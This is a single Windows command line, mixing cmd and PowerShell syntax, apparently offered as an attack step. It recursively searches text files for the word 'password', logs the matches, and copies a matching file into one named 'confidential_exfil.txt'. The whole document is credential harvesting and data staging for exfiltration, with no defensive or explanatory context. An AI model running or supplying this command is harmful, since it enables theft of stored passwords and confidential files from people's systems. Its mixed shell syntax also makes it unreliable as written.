findstr /si password *.txt >> output.txt ; $filename=(type output.txt | % {$_.Split(":") | select -First 1}) ; copy $filename confidential_exfil.txt